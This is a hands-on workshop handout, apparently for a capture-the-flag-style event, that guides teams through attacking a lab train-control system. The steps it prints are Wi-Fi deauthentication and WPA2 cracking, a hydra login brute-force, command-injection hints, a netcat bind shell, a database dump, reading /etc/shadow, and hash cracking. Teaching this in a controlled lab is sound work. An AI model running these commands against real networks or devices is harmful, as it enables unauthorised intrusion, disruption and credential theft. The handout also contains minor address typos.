# Hack the Tracks!

Goal: hack a train.

## Reminders

- Hacking is hard. **YOU CAN DO IT.**
- We'll be floating around to help. Ask us questions!
- There are multiple ways to solve the same problem.
- We will guide you, but there will be parts that you must try to figure out yourselves as a team.

We'll start off very guided, so don't worry!

## Booting Into Kali

**Kali Linux** is a live penetration testing distribution. **Live** means that it can run entirely on a USB without needing installation!

***Task: Your group has been given one or more Kali Live USBs. Boot one or more computers to Kali.***

Tutorials:
- https://www.hp.com/us-en/shop/tech-takes/how-to-boot-from-usb-drive-on-windows-10-pcs
- https://www.lifewire.com/how-to-boot-from-a-usb-device-2626091
- https://www.digitalcitizen.life/boot-your-windows-10-pc-usb-flash-drive/
- For Mac users: https://iboysoft.com/mac-data-recovery/mac-boot-from-usb.html

## Network Hacking

Plenty of computers are connected to networks, and the network domain introduces a multitude of new types of attacks. The fact that we are able to reach a computer through a network implies that we may be able to hack it remotely.

***Task: find out how to view Wi-Fi networks on Kali. Find out which Wi-Fi network it is that we want to attack. It should be very obvious, just based on the name of the Wi-Fi network.***

Now that we know the network we are targeting, it is time to hack into it! We don't know the password, but we can crack it.

WPA2 is a security standard that most modern networks use. It uses a handshake-based authentication protocol, so the password isn't transmitted over the air in plaintext. However, we can observe and capture this handshake and then crack it by running through possible passwords, known as a *bruteforce attack* (if purely running through all possible permutations) or a *dictionary attack* (if running through only likely passwords).

First, we need to find out the name of our wireless interface.

***Task: open up a terminal and run the following command to find your network interface.***

```sh
ip a
```

The name of your wireless network interface should be something like `wlp3s0` or `wlan0` or `wl0`. If you don't see any of these, call us over.

Network interface cards typically only let you view traffic designated for you. We want to view all traffic. We need to enable monitor mode.

***Task: run the following commands to start monitor mode.***

```sh
sudo airmon-ng check kill
sudo airmon-ng start <interface>
```

(Where `<interface>` is the name if your interface found earlier, such as `wlp3s0`.)

If you run the command `ip a`, then you should see a new interface like `wlp3s0mon`, `wlan0mon`, `wl0mon`, etc. which we will henceforth refer to as `<interfacemon>`.

Now, let's find out the technical details of the target network.

***Task: run the following commands to capture traffic.***

```sh
sudo airodump-ng <interfacemon>
```

Once you see the target network, hit CTRL+C in your terminal to stop `airodump-ng`. Take note of the target network's channel and BSSID. Then, we can start **capturing** (saving) traffic from the target network.

```sh
sudo airodump-ng --bssid <bssid> --channel <channel> -w capture <interfacemon>
```

We need to capture a handshake, which happens when a station first joins a network. Take note of the addresses under the "STATION" column in `airodump-ng`, which will henceforth be referred to as `<station>`. There may be multiple -- it doesn't matter which one.

***Task: in another terminal (do not stop your `airodump-ng` terminal!), run the following command to kick a station off the network and capture a handshake.***

```sh
sudo aireplay-ng -0 4 -a <bssid> -h <station> <interfacemon>
```

In your `airodump-ng` terminal, you may notice a message at the top saying a handshake was captured! If you see this, you can CTRL+C to exit `airodump-ng`. If you don't, try running that `aireplay-ng` command again.

**rockyou** is a massive list of very common passwords. Kali has a copy, but we need to extract it in order to use it.

***Task: run the following commands to copy and extract the wordlist.***

```sh
cp /usr/share/wordlists/rockyou.txt.gz ./
gunzip rockyou.txt.gz
```

Now, we can crack the handshake we captured earlier.

***Task: run the following command to crack the network password.***

```sh
aircrack-ng -w rockyou.txt capture-01.cap
```

Now you have the network password! Let's get our interface back to normal now.

```sh
sudo airmon-ng stop <interfacemon>
sudo systemctl start NetworkManager
```

***Task: connect to the network using the password you just cracked.***

Now, we need to find out targets on the network. We can do a ping sweep, where we ask every possible IP if they're on the network and wait for a response.

If you run `ip a`, you can see your IP address on the network. Notice that it starts with a `192.168.1.`. Let's scan all IPs from `192.168.2.1` to `192168.2.255`.

***Task: run the following command to ping sweep the network.***

```sh
nmap -sn 192.168.2.1/24
```

Now that we know who's on the network (spoiler: the target is `192.168.2.1`, let's scan them to see what they're running.

***Task: run the following command to scan the target.***

```sh
nmap -A 192.168.2.1
```

Notice how they have a service running on port 8080? Let's connect to it with a web browser.

***Task: open up a web browser and go to `http://192.168.2.1:8080`.***

The network hacking phase has completed.

## Web Application Hacking

We see that there is a login screen. Let's hack the `admin` account (common username in almost any system). There are two ways that you can do this:

**Option 1: SQL Injection**

Check out: https://www.geeksforgeeks.org/authentication-bypass-using-sql-injection-on-login-page/.


**Option 2: Dictionary Attack**

Hydra is a great tool for online password cracking. Run the following command to begin an attack:

```sh
hydra -l admin -P rockyou.txt -s 8080 192.168.2.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid login."
```

Explanation: run hydra against account admin with wordlist `rockyou.txt`, on port 8080 of the target 192.168.2.1. The attack type is an HTTP POST form. We expect to be redirected to `/login`, and the HTTP form that is transmitted is `username=^USER^&password=^PASS^`. If we get a wrong login, the page writes `Invalid login.` so that we know it's incorrect.

***Task: use one of the two methods above to hack into the admin account.***

*Warning: this handout is about to start getting more hands-off, and you're going to have to start figuring out more yourself. If you have trouble, call us over!*

We now have access to an interface where we can search things up using two different methods.

**Option 1: Command Injection**

The interface on the left allows us to enter a string and then it'll search the file `data/logs.txt` for that string.

The format of the command looks like:

```sh
grep $YOUR_INPUT data/logs.txt
```

So if you look up `2022-10-11`, it'll run

```sh
grep 2022-10-11 data/logs.txt
```

Can you think of any way to get this to execute our commands?

Hint 1: you can execute multiple commands in one line with the `;`. For example:

```sh
grep 2022-10-11 data/logs.txt; whoami
```

Hint 2: if you enter something and nothing happens, remember that `grep` always requires some kind of file to look through, even if that file doesn't exist! The syntax is always `grep string file`.

Hint 3: you can comment something out with `#`, and everything to the right of it will be discarded.

Hint 4: you can make a computer wait for a connection and serve a shell over said connection by using the following command *on the target computer.*

```sh
nc.traditional -l -p <port> -e /bin/sh;
```

This is where `<port>` is some number from 1 to 65536. The first 1024 ports or so are reserved, but basically any user can use higher ports.

Then, you can connect to that shell with the following command *on the attacking computer.*

```sh
nc 192.168.2.1 <port>
```

Hint 5: the command for dumping a database is the following.

```sh
sqlite3 <database> ".dump"
```

**Options 2: SQL Injection**

Check out: https://portswigger.net/web-security/sql-injection/examining-the-database

***Task: use one of the two methods above to leak the database full of user accounts and passwords. The table name is `user`.***

## Gaining User Access

You've found a bunch of usernames and passwords by now. These are logins for the **web application.**

Let's gain access to a user account via SSH. SSH gives us remote access. The syntax to SSH into a computer is:

```sh
ssh <username>@<host>
```

So in our case, it would be:

```sh
ssh <username>@192.168.2.1
```

You will be prompted for a password afterwards.

Hint: do you re-use your passwords?

***Task: gain access to a user account on the system.***

## Privilege Escalation

You have access to a low privilege user account at this point. This means that the things it can do are rather limited. In order to do some more damage, we need to *escalate* our privileges.

The user account you have access to has access to a `suid` binary: a program that executes with higher privileges. Try to see what you can do.

Hint 1: user account password hashes are stored in `/etc/shadow`.

Hint 2: you can crack hashes with either John the Ripper or hashcat, both very popular tools and included in Kali. Assuming that `hash.txt` contains only the hash of the account being cracked, the commands for John are as follows:

```sh
john --wordlist=<wordlist> hash.txt
john --show hash.txt
```

The syntax for hashcat, on the other hand, is as follows:

```sh
hashcat -m 500 -a 0 hash.txt rockyou.txt
```

***Task: escalate your privileges to hack the railmaster account.***

## Hack the Tracks!

What does railmaster have access to?

***Task: hack the train.***
